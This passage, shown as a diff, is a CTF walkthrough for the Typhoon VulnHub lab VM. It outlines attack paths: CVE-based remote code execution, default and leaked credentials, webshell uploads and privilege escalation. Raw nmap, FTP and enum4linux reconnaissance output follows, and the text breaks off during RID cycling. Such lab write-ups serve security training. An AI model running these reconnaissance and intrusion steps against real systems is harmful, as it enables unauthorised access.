@@ -1,0 +1,3168 @@
+=======================================================================================
+Walkthrough of the Typhoon VulnHub VM CTF
+=======================================================================================
+
+Step 1. Scanning & Enumeration
+	> Nmap + Nikto + Dirb + Searchsploit + Enum4linux + Showmount + FTP test + Metasploit modules
+
+
+Step 2. Gaining Access
+
+	> Apache Struts Web server  (TCP 8080)
+	  + CVE-2017-5638 - Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution vulnerability
+
+	> Apache Tomcat Web server (TCP 8080)
+	  + Default Apache Tomcat manager credentials (tomcat:tomcat)
+	    => Upload of a JSP webshell
+
+	> Apache Web server (TCP 8080)
+	  + Dangerous PUT Http method enabled 
+	    => Upload of a webshell
+	
+	> Apache Web server  (TCP 80)	  
+	  + CVE-2014-6271 - Apache CGI-BIN Shellshock - Remote Code Execution vulnerability
+		
+	> PhpMoAdmin  
+	  + CVE-2015-2208 - PhpMoAdmin 1.1.2 - Remote Code Execution vulnerability
+	  
+	> LotusCMS web app  
+	  + CVE-2011-0518 - LotusCMS 3.0 - Eval() Remote Command Execution vulnerability
+	   	  
+	> CUPS 1.7 (TCP 631)
+	  + Vulnerable version of CUPS 1.7 (Shellshock RCE but need creds)
+	  + Dangerous PUT Http method enabled => Upload of a webshell
+	  
+	> Postgresql database
+	  + Default Postgresql database credentials (postgres:postgres)
+	  + Possibility to read file on the server (MSF 'auxiliary/admin/postgres/postgres_readfile')
+	  + Password reuse on Linux (SSH)
+	  
+	> MongoDB database
+	  + Unauthenticated access to MongoDB Http and database servers
+	    => login with no password with a db client (MongoDB Compass Community)
+		=> Then click on the 'credentials' database
+		=> Then click on the collection 'credentials.creds' which contains clear-text linux creds (typhoon:789456123)
+	  + Linux password disclosure in MongoDB HTTP server (typhoon:789456123)
+	  
+	> SAMBA file server
+	  + Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution  (python exploit doesn't work but metapsloit yes...)
+	  + Unauthenticated access to SMB/SAMBA shares	  
+
+	> REDIS database
+	  + Unauthenticated access to Redis (use the Mespaloit scanner 'scanner/redis/redis_login')
+	  + File upload feature to add our ssh key using Metasploit 'auxiliary/scanner/redis/file_upload' 
+	  
+	> Unauthenticated access to an NFS export share
+	> Unauthenticated access to an FTP server
+	
+	
+Step 3. Linux enumeration (Manual search + scripts: "LinEnum.sh" & "Linux-exploit-suggester.sh")
+
+
+Step 4. Privilege escalation to root
+	> Method 1: the binary 'Vim.basic' is SUID 'root'
+	> Method 2: the linux account 'admin' has SUDO all
+	> Method 3: Linux kernel exploits:
+				+ CVE-2016-5195 - Dirtycow
+				+ CVE-2015-1328 - Overlayfs
+
+
+========================================================================================================
+
+ Currently scanning: 192.168.78.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 16 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 996              
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.3     14:0c:76:53:4d:4e      1      60  FREEBOX SAS                 
+ 192.168.1.29    f4:5c:89:c9:be:c5      1      60  Apple, Inc.                 
+ 192.168.1.254   68:a3:78:8b:0c:dd      5     336  FREEBOX SAS                 
+ 192.168.1.104   08:00:27:34:bf:f6      8     480  PCS Systemtechnik GmbH      
+ 192.168.27.1    14:0c:76:53:4d:4e      1      60  FREEBOX SAS                 
+
+========================================================================================================
+
+root@Security-Audit-01:~# nmap -sC -sS -sV -P0 -p- 192.168.1.104 
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 01:45 CET
+Stats: 0:00:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 95.83% done; ETC: 01:46 (0:00:02 remaining)
+Nmap scan report for 192.168.1.104
+Host is up (0.00044s latency).
+Not shown: 65511 closed ports
+
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.2
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.1.9
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+
+22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)
+|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)
+|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)
+|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)
+
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+|_ssl-date: TLS randomness does not represent time
+
+53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3-Ubuntu
+
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/mongoadmin/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Typhoon Vulnerable VM by PRISMA CSI
+
+110/tcp   open  pop3?
+
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      39021/udp  mountd
+|   100005  1,2,3      42232/tcp  mountd
+|   100021  1,3,4      41167/tcp  nlockmgr
+|   100021  1,3,4      58813/udp  nlockmgr
+|   100024  1          40283/udp  status
+|   100024  1          51811/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+143/tcp   open  imap        Dovecot imapd
+|_ssl-date: TLS randomness does not represent time
+
+445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+
+631/tcp   open  ipp         CUPS 1.7
+| http-methods: 
+|_  Potentially risky methods: PUT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: CUPS/1.7 IPP/2.1
+|_http-title: Home - CUPS 1.7.2
+
+993/tcp   open  ssl/imaps?
+995/tcp   open  ssl/pop3s?
+
+2049/tcp  open  nfs_acl     2-3 (RPC #100227)
+
+3306/tcp  open  mysql       MySQL (unauthorized)
+
+5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
+|_ssl-date: TLS randomness does not represent time
+
+6379/tcp  open  redis       Redis key-value store 4.0.11
+
+8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat
+
+27017/tcp open  mongodb     MongoDB 3.0.15
+| mongodb-databases: 
+|   databases
+|     0
+|       empty = false
+|       sizeOnDisk = 83886080.0
+|       name = credentials
+|     1
+|       empty = false
+|       sizeOnDisk = 83886080.0
+|       name = local
+|   totalSize = 167772160.0
+|_  ok = 1.0
+| mongodb-info: 
+|   MongoDB Build info
+|     loaderFlags = 
+|     version = 3.0.15
+|     allocator = tcmalloc
+|     debug = false
+|     bits = 64
+|     versionArray
+|       2 = 15
+|       3 = 0
+|       0 = 3
+|       1 = 0
+|     OpenSSLVersion = OpenSSL 1.0.1f 6 Jan 2014
+|     ok = 1.0
+|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99
+|     maxBsonObjectSize = 16777216
+|     gitVersion = b8ff507269c382bc100fc52f75f48d54cd42ec3b
+|     javascriptEngine = V8
+|     sysInfo = Linux ip-10-71-195-23 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
+|   Server status
+|     ok = 1.0
+|     version = 3.0.15
+|     storageEngine
+|       name = mmapv1
+|     opcountersRepl
+|       insert = 0
+|       query = 0
+|       command = 0
+|       getmore = 0
+|       update = 0
+|       delete = 0
+|     backgroundFlushing
+|       last_finished = 1549068444952
+|       average_ms = 0.25
+|       flushes = 4
+|       last_ms = 0
+|       total_ms = 1
+|     host = typhoon.local
+|     globalLock
+|       currentQueue
+|         total = 0
+|         readers = 0
+|         writers = 0
+|       activeClients
+|         total = 9
+|         readers = 0
+|         writers = 0
+|       totalTime = -3318466000
+|     cursors
+|       totalNoTimeout = 0
+|       clientCursors_size = 0
+|       pinned = 0
+|       note = deprecated, use server status metrics
+|       timedOut = 0
+|       totalOpen = 0
+|     uptimeMillis = -3318447
+|     uptimeEstimate = 239.0
+|     process = mongod
+|     extra_info
+|       note = fields vary by platform
+|       page_faults = 8
+|       heap_usage_bytes = 63068072
+|     writeBacksQueued = false
+|     connections
+|       totalCreated = 2
+|       available = 51199
+|       current = 1
+|     locks
+|       Global
+|         acquireCount
+|           r = 1022
+|           w = 9
+|           W = 5
+|       Database
+|         acquireCount
+|           R = 2
+|           W = 9
+|           r = 502
+|       MMAPV1Journal
+|         acquireCount
+|           r = 502
+|           w = 22
+|           R = 55
+|       Collection
+|         acquireCount
+|           R = 522
+|     network
+|       bytesOut = 9897
+|       bytesIn = 65
+|       numRequests = 1
+|     pid = 1388
+|     mem
+|       supported = true
+|       resident = 69
+|       mappedWithJournal = 320
+|       bits = 64
+|       mapped = 160
+|       virtual = 514
+|     uptime = -3319.0
+|     opcounters
+|       insert = 0
+|       query = 1
+|       command = 2
+|       getmore = 0
+|       update = 0
+|       delete = 0
+|     localTime = 1549068484937
+|     metrics
+|       queryExecutor
+|         scannedObjects = 0
+|         scanned = 0
+|       cursor
+|         open
+|           pinned = 0
+|           total = 0
+|           noTimeout = 0
+|         timedOut = 0
+|       commands
+|         _recvChunkCommit
+|           failed = 0
+|           total = 0
+|         mapreduce
+|           shardedfinish
+|             failed = 0
+|             total = 0
+|         aggregate
+|           failed = 0
+|           total = 0
+|         serverStatus
+|           failed = 0
+|           total = 2
+|         touch
+|           failed = 0
+|           total = 0
+|         compact
+|           failed = 0
+|           total = 0
+|         features
+|           failed = 0
+|           total = 0
+|         createUser
+|           failed = 0
+|           total = 0
+|         hostInfo
+|           failed = 0
+|           total = 0
+|         buildInfo
+|           failed = 0
+|           total = 0
+|         dataSize
+|           failed = 0
+|           total = 0
+|         saslContinue
+|           failed = 0
+|           total = 0
+|         grantPrivilegesToRole
+|           failed = 0
+|           total = 0
+|         rolesInfo
+|           failed = 0
+|           total = 0
+|         replSetFreeze
+|           failed = 0
+|           total = 0
+|         repairDatabase
+|           failed = 0
+|           total = 0
+|         getShardVersion
+|           failed = 0
+|           total = 0
+|         dropIndexes
+|           failed = 0
+|           total = 0
+|         _recvChunkStart
+|           failed = 0
+|           total = 0
+|         diagLogging
+|           failed = 0
+|           total = 0
+|         distinct
+|           failed = 0
+|           total = 0
+|         planCacheClearFilters
+|           failed = 0
+|           total = 0
+|         shutdown
+|           failed = 0
+|           total = 0
+|         authSchemaUpgrade
+|           failed = 0
+|           total = 0
+|         createRole
+|           failed = 0
+|           total = 0
+|         dropRole
+|           failed = 0
+|           total = 0
+|         dropAllRolesFromDatabase
+|           failed = 0
+|           total = 0
+|         revokeRolesFromRole
+|           failed = 0
+|           total = 0
+|         replSetInitiate
+|           failed = 0
+|           total = 0
+|         geoNear
+|           failed = 0
+|           total = 0
+|         invalidateUserCache
+|           failed = 0
+|           total = 0
+|         replSetGetRBID
+|           failed = 0
+|           total = 0
+|         cleanupOrphaned
+|           failed = 0
+|           total = 0
+|         forceerror
+|           failed = 0
+|           total = 0
+|         planCacheSetFilter
+|           failed = 0
+|           total = 0
+|         updateUser
+|           failed = 0
+|           total = 0
+|         drop
+|           failed = 0
+|           total = 0
+|         resync
+|           failed = 0
+|           total = 0
+|         applyOps
+|           failed = 0
+|           total = 0
+|         filemd5
+|           failed = 0
+|           total = 0
+|         cloneCollectionAsCapped
+|           failed = 0
+|           total = 0
+|         _recvChunkStatus
+|           failed = 0
+|           total = 0
+|         checkShardingIndex
+|           failed = 0
+|           total = 0
+|         insert
+|           failed = 0
+|           total = 0
+|         dbStats
+|           failed = 0
+|           total = 0
+|         writebacklisten
+|           failed = 0
+|           total = 0
+|         dropAllUsersFromDatabase
+|           failed = 0
+|           total = 0
+|         medianKey
+|           failed = 0
+|           total = 0
+|         unsetSharding
+|           failed = 0
+|           total = 0
+|         listCommands
+|           failed = 0
+|           total = 0
+|         ping
+|           failed = 0
+|           total = 0
+|         collMod
+|           failed = 0
+|           total = 0
+|         copydb
+|           failed = 0
+|           total = 0
+|         collStats
+|           failed = 0
+|           total = 0
+|         isMaster
+|           failed = 0
+|           total = 0
+|         renameCollection
+|           failed = 0
+|           total = 0
+|         <UNKNOWN> = 0
+|         logRotate
+|           failed = 0
+|           total = 0
+|         eval
+|           failed = 0
+|           total = 0
+|         replSetFresh
+|           failed = 0
+|           total = 0
+|         logout
+|           failed = 0
+|           total = 0
+|         replSetHeartbeat
+|           failed = 0
+|           total = 0
+|         replSetStepDown
+|           failed = 0
+|           total = 0
+|         handshake
+|           failed = 0
+|           total = 0
+|         driverOIDTest
+|           failed = 0
+|           total = 0
+|         dropDatabase
+|           failed = 0
+|           total = 0
+|         getPrevError
+|           failed = 0
+|           total = 0
+|         listIndexes
+|           failed = 0
+|           total = 0
+|         connPoolStats
+|           failed = 0
+|           total = 0
+|         getCmdLineOpts
+|           failed = 0
+|           total = 0
+|         clone
+|           failed = 0
+|           total = 0
+|         replSetSyncFrom
+|           failed = 0
+|           total = 0
+|         getnonce
+|           failed = 0
+|           total = 0
+|         parallelCollectionScan
+|           failed = 0
+|           total = 0
+|         authenticate
+|           failed = 0
+|           total = 0
+|         dropUser
+|           failed = 0
+|           total = 0
+|         find
+|           failed = 0
+|           total = 0
+|         connPoolSync
+|           failed = 0
+|           total = 0
+|         getParameter
+|           failed = 0
+|           total = 0
+|         getShardMap
+|           failed = 0
+|           total = 0
+|         fsync
+|           failed = 0
+|           total = 0
+|         availableQueryOptions
+|           failed = 0
+|           total = 0
+|         whatsmyuri
+|           failed = 0
+|           total = 0
+|         validate
+|           failed = 0
+|           total = 0
+|         usersInfo
+|           failed = 0
+|           total = 0
+|         updateRole
+|           failed = 0
+|           total = 0
+|         _isSelf
+|           failed = 0
+|           total = 0
+|         update
+|           failed = 0
+|           total = 0
+|         getLastError
+|           failed = 0
+|           total = 0
+|         create
+|           failed = 0
+|           total = 0
+|         top
+|           failed = 0
+|           total = 0
+|         findAndModify
+|           failed = 0
+|           total = 0
+|         replSetElect
+|           failed = 0
+|           total = 0
+|         dbHash
+|           failed = 0
+|           total = 0
+|         splitVector
+|           failed = 0
+|           total = 0
+|         splitChunk
+|           failed = 0
+|           total = 0
+|         listCollections
+|           failed = 0
+|           total = 0
+|         mergeChunks
+|           failed = 0
+|           total = 0
+|         shardingState
+|           failed = 0
+|           total = 0
+|         shardConnPoolStats
+|           failed = 0
+|           total = 0
+|         setShardVersion
+|           failed = 0
+|           total = 0
+|         explain
+|           failed = 0
+|           total = 0
+|         replSetUpdatePosition
+|           failed = 0
+|           total = 0
+|         setParameter
+|           failed = 0
+|           total = 0
+|         createIndexes
+|           failed = 0
+|           total = 0
+|         geoSearch
+|           failed = 0
+|           total = 0
+|         _transferMods
+|           failed = 0
+|           total = 0
+|         saslStart
+|           failed = 0
+|           total = 0
+|         _migrateClone
+|           failed = 0
+|           total = 0
+|         revokeRolesFromUser
+|           failed = 0
+|           total = 0
+|         revokePrivilegesFromRole
+|           failed = 0
+|           total = 0
+|         copydbsaslstart
+|           failed = 0
+|           total = 0
+|         convertToCapped
+|           failed = 0
+|           total = 0
+|         copydbgetnonce
+|           failed = 0
+|           total = 0
+|         resetError
+|           failed = 0
+|           total = 0
+|         listDatabases
+|           failed = 0
+|           total = 0
+|         grantRolesToUser
+|           failed = 0
+|           total = 0
+|         _mergeAuthzCollections
+|           failed = 0
+|           total = 0
+|         moveChunk
+|           failed = 0
+|           total = 0
+|         currentOpCtx
+|           failed = 0
+|           total = 0
+|         repairCursor
+|           failed = 0
+|           total = 0
+|         replSetMaintenance
+|           failed = 0
+|           total = 0
+|         profile
+|           failed = 0
+|           total = 0
+|         appendOplogNote
+|           failed = 0
+|           total = 0
+|         replSetGetStatus
+|           failed = 0
+|           total = 0
+|         replSetReconfig
+|           failed = 0
+|           total = 0
+|         connectionStatus
+|           failed = 0
+|           total = 0
+|         count
+|           failed = 0
+|           total = 0
+|         reIndex
+|           failed = 0
+|           total = 0
+|         planCacheClear
+|           failed = 0
+|           total = 0
+|         planCacheListQueryShapes
+|           failed = 0
+|           total = 0
+|         planCacheListPlans
+|           failed = 0
+|           total = 0
+|         _getUserCacheGeneration
+|           failed = 0
+|           total = 0
+|         planCacheListFilters
+|           failed = 0
+|           total = 0
+|         mapReduce
+|           failed = 0
+|           total = 0
+|         group
+|           failed = 0
+|           total = 0
+|         grantRolesToRole
+|           failed = 0
+|           total = 0
+|         cloneCollection
+|           failed = 0
+|           total = 0
+|         getLog
+|           failed = 0
+|           total = 0
+|         delete
+|           failed = 0
+|           total = 0
+|         replSetGetConfig
+|           failed = 0
+|           total = 0
+|         cursorInfo
+|           failed = 0
+|           total = 0
+|         _recvChunkAbort
+|           failed = 0
+|           total = 0
+|       record
+|         moves = 0
+|       getLastError
+|         wtimeouts = 0
+|         wtime
+|           totalMillis = 0
+|           num = 0
+|       document
+|         inserted = 0
+|         updated = 0
+|         returned = 0
+|         deleted = 0
+|       storage
+|         freelist
+|           search
+|             scanned = 0
+|             bucketExhausted = 0
+|             requests = 0
+|       ttl
+|         deletedDocuments = 0
+|         passes = 4
+|       repl
+|         preload
+|           docs
+|             totalMillis = 0
+|             num = 0
+|           indexes
+|             totalMillis = 0
+|             num = 0
+|         apply
+|           batches
+|             totalMillis = 0
+|             num = 0
+|           ops = 0
+|         buffer
+|           count = 0
+|           sizeBytes = 0
+|           maxSizeBytes = 268435456
+|         network
+|           getmores
+|             totalMillis = 0
+|             num = 0
+|           readersCreated = 0
+|           bytes = 0
+|           ops = 0
+|       operation
+|         idhack = 0
+|         writeConflicts = 0
+|         scanAndOrder = 0
+|         fastmod = 0
+|     dur
+|       journaledMB = 0.008192
+|       timeMs
+|         commitsInWriteLock = 0
+|         writeToJournal = 1
+|         writeToDataFiles = 0
+|         commits = 0
+|         prepLogBuffer = 0
+|         remapPrivateView = 0
+|         dt = 3015
+|       commits = 29
+|       earlyCommits = 0
+|       commitsInWriteLock = 0
+|       writeToDataFilesMB = 0.001296
+|       compression = 5.7812279463656
+|     asserts
+|       user = 0
+|       rollovers = 0
+|       regular = 0
+|       warning = 0
+|_      msg = 0
+39542/tcp open  mountd      1-3 (RPC #100005)
+39845/tcp open  mountd      1-3 (RPC #100005)
+41167/tcp open  nlockmgr    1-4 (RPC #100021)
+42232/tcp open  mountd      1-3 (RPC #100005)
+
+51811/tcp open  status      1 (RPC #100024)
+
+MAC Address: 08:00:27:34:BF:F6 (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  typhoon, TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
+|_nbstat: NetBIOS name: TYPHOON, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 4.1.6-Ubuntu)
+|   Computer name: typhoon
+|   NetBIOS computer name: TYPHOON\x00
+|   Domain name: local
+|   FQDN: typhoon.local
+|_  System time: 2019-02-02T02:48:03+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-02-02 01:48:03
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 305.04 seconds
+root@Security-Audit-01:~# 
+
+==============================================================================================================
+
+oot@Security-Audit-01:~# ftp 192.168.1.104 
+Connected to 192.168.1.104.
+220 (vsFTPd 3.0.2)
+Name (192.168.1.104:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!		dir		mdelete		qc		site
+$		disconnect	mdir		sendport	size
+account		exit		mget		put		status
+append		form		mkdir		pwd		struct
+ascii		get		mls		quit		system
+bell		glob		mode		quote		sunique
+binary		hash		modtime		recv		tenex
+bye		help		mput		reget		tick
+case		idle		newer		rstatus		trace
+cd		image		nmap		rhelp		type
+cdup		ipany		nlist		rename		user
+chmod		ipv4		ntrans		reset		umask
+close		ipv6		open		restart		verbose
+cr		lcd		prompt		rmdir		?
+delete		ls		passive		runique
+debug		macdef		proxy		send
+ftp> pwd
+257 "/"
+ftp> ls -al
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        129          4096 Oct 23 00:05 .
+drwxr-xr-x    2 0        129          4096 Oct 23 00:05 ..
+226 Directory send OK.
+ftp> 
+
+==========================================================================================================
+
+root@Security-Audit-01:~# enum4linux 192.168.1.104 
+
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Feb  2 02:00:47 2019
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.1.104
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.1.104    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 192.168.1.104    |
+ ============================================= 
+Looking up status of 192.168.1.104
+	TYPHOON         <00> -         B <ACTIVE>  Workstation Service
+	TYPHOON         <03> -         B <ACTIVE>  Messenger Service
+	TYPHOON         <20> -         B <ACTIVE>  File Server Service
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 192.168.1.104    |
+ ====================================== 
+[+] Server 192.168.1.104 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 192.168.1.104    |
+ ============================================ 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================= 
+|    OS information on 192.168.1.104    |
+ ======================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.1.104 from smbclient: 
+[+] Got OS info for 192.168.1.104 from srvinfo:
+	TYPHOON        Wk Sv PrQ Unx NT SNT Samba 4.1.6-Ubuntu
+	platform_id     :	500
+	os version      :	4.9
+	server type     :	0x809a03
+
+ ============================== 
+|    Users on 192.168.1.104    |
+ ============================== 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: typhoon	Name: typhoon	Desc: 
+index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: admin	Name: 	Desc: 
+
+user:[typhoon] rid:[0x3e8]
+user:[admin] rid:[0x3e9]
+
+ ========================================== 
+|    Share Enumeration on 192.168.1.104    |
+ ========================================== 
+WARNING: The "syslog" option is deprecated
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Samba 4.1.6-Ubuntu)
+	typhoon         Disk      typhoon
+	print$          Disk      Printer Drivers
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            
+
+[+] Attempting to map shares on 192.168.1.104
+//192.168.1.104/IPC$	[E] Can't understand response:
+WARNING: The "syslog" option is deprecated
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//192.168.1.104/typhoon	Mapping: OK, Listing: OK
+//192.168.1.104/print$	Mapping: DENIED, Listing: N/A
+
+ ===================================================== 
+|    Password Policy Information for 192.168.1.104    |
+ ===================================================== 
+
+
+[+] Attaching to 192.168.1.104 using a NULL share
+
+[+] Trying protocol 445/SMB...
+
+[+] Found domain(s):
+
+	[+] TYPHOON
+	[+] Builtin
+
+[+] Password Info for Domain: TYPHOON
+
+	[+] Minimum password length: 5
+	[+] Password history length: None
+	[+] Maximum password age: 37 days 6 hours 21 minutes 
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: None
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ =============================== 
+|    Groups on 192.168.1.104    |
+ =============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================== 
+|    Users on 192.168.1.104 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-830993545-1361545238-2689178323
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-21-830993545-1361545238-2689178323 and logon username '', password ''
+S-1-5-21-830993545-1361545238-2689178323-500 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-501 TYPHOON\nobody (Local User)
+S-1-5-21-830993545-1361545238-2689178323-502 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-503 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-504 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-505 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-506 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-507 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-508 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-509 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-510 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-511 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-512 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-513 TYPHOON\None (Domain Group)
+S-1-5-21-830993545-1361545238-2689178323-514 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-515 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-516 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-517 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-518 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-519 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-520 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-521 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-522 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-523 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-524 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-525 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-526 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-527 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-528 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-529 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-530 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-531 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-532 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-533 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-534 *unknown*\*unknown* (8)
+S-1-5-21-830993545-1361545238-2689178323-535 *unknown*\*unknown* (8)
